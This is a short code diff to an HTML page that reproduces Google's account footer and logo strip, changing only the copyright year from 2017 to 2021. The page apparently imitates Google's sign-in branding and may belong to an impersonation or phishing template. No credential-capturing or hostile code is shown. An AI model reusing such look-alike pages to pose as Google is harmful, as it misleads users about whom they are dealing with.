@@ -215,7 +215,7 @@ starteffect()
 <div style="height:110px;color: #737373;background-color: #f7f7f7;" class="btn btn-block">
 <center><p>One Google Account for everything Google </p></center>
 <img src="https://ssl.gstatic.com/accounts/ui/wlogostrip_230x17_1x.png"/></p>
-<p>Copyright &copy; 2017 Google Inc.</p>
+<p>Copyright &copy; 2021 Google Inc.</p>
 
   </div>
   </div>
